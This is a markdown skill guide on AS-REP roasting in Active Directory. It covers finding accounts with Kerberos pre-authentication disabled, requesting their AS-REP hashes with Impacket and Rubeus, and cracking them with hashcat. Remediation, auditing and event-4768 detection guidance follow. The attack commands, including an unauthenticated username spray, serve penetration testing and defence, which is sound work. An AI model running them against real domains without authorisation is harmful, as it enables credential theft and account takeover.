---
name: as-rep-roasting
domain: 12-active-directory-and-windows-security
description: Use when hunting for AD accounts that don't require Kerberos pre-authentication — crackable without any credentials — and how to remove the exposure.
difficulty: intermediate
tags: [active-directory, kerberos, as-rep-roasting, credential-cracking, windows]
tools: [impacket, rubeus, hashcat]
---

## Purpose

AS-REP roasting is Kerberoasting's easier cousin. Any account configured with "do not require Kerberos pre-authentication" will hand out a chunk of data encrypted with its password hash to *anyone who asks* — no credentials needed. Request it, crack it offline, and you have the account's password. This skill covers finding those accounts and eliminating the misconfiguration that exposes them.

## When to use it

Early in an AD engagement — it's one of the few credential attacks that needs no prior authentication, so it's often a first move. Also worth a defensive sweep of your own domain, because the vulnerable setting is easy to leave on by accident and hard to notice.

## Procedure

1. **Find accounts with pre-auth disabled.** They have the `DONT_REQ_PREAUTH` flag set. With any domain credentials you can query LDAP; without credentials you can still try a list of likely usernames:
   ```
   # with creds — enumerate flagged accounts and request their AS-REP
   GetNPUsers.py domain.local/user:pass -dc-ip <dc> -request

   # without creds — try a username list (no auth needed for the ASK)
   GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip <dc> -no-pass
   ```
2. **Collect the AS-REP hashes** returned for the vulnerable accounts. These are what you crack.
3. **Crack offline** — like Kerberoasting, this happens on your machine, silent and unrate-limited:
   ```
   hashcat -m 18200 asrep_hashes.txt wordlist.txt
   ```
4. **Prioritise by privilege.** A cracked service or admin account with pre-auth disabled is a straight escalation; a low-priv user is still a foothold and a credential for other attacks.
5. Report the exact accounts with the flag and how strong their passwords were — the fix targets both the flag and any weak passwords found.

## Cheatsheet

```bash
# with domain creds: find + request flagged accounts
GetNPUsers.py dom.local/user:pass -dc-ip 10.0.0.1 -request -format hashcat

# no creds: spray a username list (the AS-REQ needs no auth)
GetNPUsers.py dom.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# from a Windows foothold
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# crack (AS-REP = hashcat mode 18200)
hashcat -m 18200 asrep.txt rockyou.txt -r rules/best64.rule

# find flagged accounts via LDAP (defensive audit)
# userAccountControl has the DONT_REQ_PREAUTH bit (0x400000 / 4194304)
```

## Reading the output

- **An AS-REP returned for an account** = pre-auth is disabled on it; the hash is crackable. That's the exposure, before you even crack it.
- **A hash that cracks quickly** = a weak password on an account that's already needlessly exposed — the double failure. The privilege of that account sets the severity.
- **A crackable admin/service account with pre-auth off** = direct escalation path; treat as high.
- **Accounts flagged but with strong passwords** = still a misconfiguration to fix (why is pre-auth off?), but the immediate crack risk is lower.
- **The no-creds username spray landing hits** = pre-auth-disabled accounts are exposed to fully unauthenticated attackers — the worst case, since no foothold is required.

## The fix

- **Require Kerberos pre-authentication on every account** — remove the `DONT_REQ_PREAUTH` flag. Pre-auth is on by default; the vulnerable state is a deliberate (or accidental) change, and there's rarely a good reason to keep it off. This is the direct fix.
- **Audit for the flag regularly** — a scheduled LDAP query for `userAccountControl & 4194304` catches accounts that get misconfigured over time.
- **Enforce strong passwords**, especially on any account that must have pre-auth disabled for a legacy reason — length is the defence against offline cracking (same reasoning as Kerberoasting).
- **Detect it**: an AS-REQ without pre-authentication (event 4768 with pre-auth type 0) from an unusual source is a roasting signal worth alerting on — feed it to detection engineering.

## Pitfalls

- **Assuming you need credentials.** The dangerous property is that the AS-REQ needs none — a username list alone can roast exposed accounts. Don't treat it as a post-auth-only risk.
- **Fixing the flag but leaving a weak password.** If a legacy account genuinely must keep pre-auth off, a weak password still cracks; enforce a long one.
- **Overlooking it because Kerberoasting got the attention.** AS-REP roasting is easier (no creds) and often forgotten in defensive sweeps. Audit the flag.
- **Ignoring detection.** The request looks like normal Kerberos unless you specifically watch for missing pre-auth. Set the alert.

## References

- MITRE ATT&CK — T1558.004 (AS-REP Roasting)
- Impacket GetNPUsers and Rubeus documentation
- Microsoft — Kerberos pre-authentication and userAccountControl flags
